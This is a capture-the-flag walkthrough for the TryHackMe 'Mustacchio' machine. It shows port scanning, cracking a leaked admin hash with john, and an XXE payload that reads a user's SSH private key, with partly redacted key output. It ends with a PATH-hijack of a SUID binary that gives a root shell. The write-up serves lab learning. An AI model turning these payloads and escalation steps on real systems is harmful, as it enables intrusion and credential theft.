---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Mustacchio
# DESCRIPTION       . Easy boot2root Machine
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/mustacchio
```

```bash
sudo nmap -sSVC -T5 -p- -oN mustacchio 10.10.15.90
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 581b0c0ffacf05be4cc07af1f188611c (RSA)
|   256 3cfce8a37e039a302c77e00a1ce452e6 (ECDSA)
|_  256 9d59c6c779c554c41daae4d184710192 (ED25519)

80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Mustacchio | Home
|_http-server-header: Apache/2.4.18 (Ubuntu)

8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
|_http-server-header: nginx/1.10.3 (Ubuntu)
```

#### PORT 80 

- I took a look around the website while the nmap scan was still running and I could find nothing of interest, so I decided to take a quick look at the source code too.

- In the header of the website I noticed that the `mobile.js` file is sourced from `/custom/js` so I decided to take a look in `/custom`. 

- I found `users.bak` in `/custom/js`. 

- This is a SQLite3 database. here's how to read the tables.

```bash
sqlite3 users.bak

sqlite> .tables
users

sqlite> PRAGMA table_info(users);
0|username|TEXT|1||0
1|password|TEXT|1||0

sqlite> SELECT * FROM users;
admin|{redacted}
```

- Now that we have the hash for the `admin` user, all we have to do is to find a colision.

- I've chose to do this using `john`. 

```bash
/opt/john/run/john hash -w=/usr/share/wordlists/rockyou.txt 
```

```
b{redacted}9        (?)     
```

- I was tempted to try this against the SSH service, but since there's another web server running on port 8765, let's take a look there first.

#### PORT 8765

- The credentials found earlier allow us to authenticate here ; 

- The admin pannel allows us to "add a comment on the website" through a text box;

- However, by looking at the source code, we can find the following

```js
 <script type="text/javascript">
      //document.cookie = "Example=/auth/dontforget.bak"; 
      function checktarea() {
      let tbox = document.getElementById("box").value;
      if (tbox == null || tbox.length == 0) {
        alert("Insert XML Code!")
      }
  }
</script>
```

```html
<!-- Barry, you can now SSH in using your key!-->
```

- I used `wget http://IP:8765/auth/dontforget.bak` to get the file. This time is a XML.

```
<?xml version="1.0" encoding="UTF-8"?>
	<comment>
		  <name>Joe Hamd</name>
		  <author>Barry Clad</author>
		  <com>
			  his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.
			  </com>
	</comment>
```

- Down the rabbit hole we go :D 

- Anyway, the HTML comment is still relevant, as barry seems to be an existing user on the server. I checked and it doesn't allow for password authentication, so we must find the private key of barry.

- However, after further analysis of the JS function found in the source code, I noticed that in case we press `submit` without any text in the box, we're asked to `Insert XML code`.

- Let's check to see if this form is vulnerable to `XXE` - XML External Entity injection.

- The general XML document that can read files from the system should look similar to the structure below.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE <element_name> [<!ENTITY <entity_name> SYSTEM 'file:///path/to/file'>]>
<root> 
	<element_name_used_above>
		&entity_name_used_above;
	</element_name_used_above> 
</root>
```

- If we type just a character and submit, we're shown the preview of the comment. 

```
Name:

Author :

Comment :
```

- It has three elements: `name`, `author` and `comment`.

- We assume that the private key of barry is in the `.ssh` directory under his home.

- The payload will be something like this

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [<!ENTITY whatever SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
<root> 
	<name>
		&whatever;
	</name> 
</root>
```

- The entity name is not important. It can be whatever you want, but make sure to have one of the three elements as .. well, element name. 

- In the scenario above, the content of the file will be shown in the `name` cell. If  you want, for whatever reason, to show the output under `author`, all you'd have to change is `name` to `author` after `<!DOCTYPE`.

- For a better output, we can switch to source code.

```
h3>Comment Preview:</h3><p>Name: 
		-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E
jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
                        {REDACTED}
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
	</p><p>Author : </p><p>Comment :<br> <p/>    </section>
```

- Copy the `private_key` and use `chmod 600` on the file.

- Then, to connect, use `ssh -i <private_key_file> barry@ip`.

- The passphase can be obtained following the steps below

```bash
# convert the key to a format compatible with john
python3 /opt/john/run/ssh2john.py id_rsa > passphase

# use rockyou against the key to find out the passphase
/opt/john/run/john passphase -w=/usr/share/wordlists/rockyou.txt 

{redacted}       (id_rsa)   
```

- The first flag is located in `/home/barry/user.txt`.

- During the manual enumeration, I found an unusual file with the `SUID` bit set.

```bash
find / -type f -perm -04000 -ls 2>/dev/null\
```

```
257605     20 -rwsr-xr-x   1 root     root          16832 Jun 12  2021 /home/joe/live_log
```

- The file is owned by root:root but we can execute it and all what it does is to output the nginx logs.

- By using `cat` on the file, we're able to deduce that from the line

```
�ff.������H�H��Live Nginx Log Readertail -f /var/log/nginx/access.log@����t,����<����|��
```

- It's safe to assume that it runs `tail -f /var/log/nginx/access.log` as root ; 

- However, we can create another file called `tail` in a writable directory and add that as the first entry in the `PATH`, containing a simple command to spawn a bash shell.

- Since this will be executed by root, we will get a shell as root.

- I chose to do this in barry's home

```bash
touch tail
vim tail

<i>
#/bin/bash
bash

<esc>
:wq
<enter>
```

```bash
cat /home/barry/tail 

#!/bin/bash
bash
```

- Now, run the file as usual.

```
barry@mustacchio:~$ /home/joe/live_log 
root@mustacchio:~# 
```

- The last flag is in `/root/root.txt`.

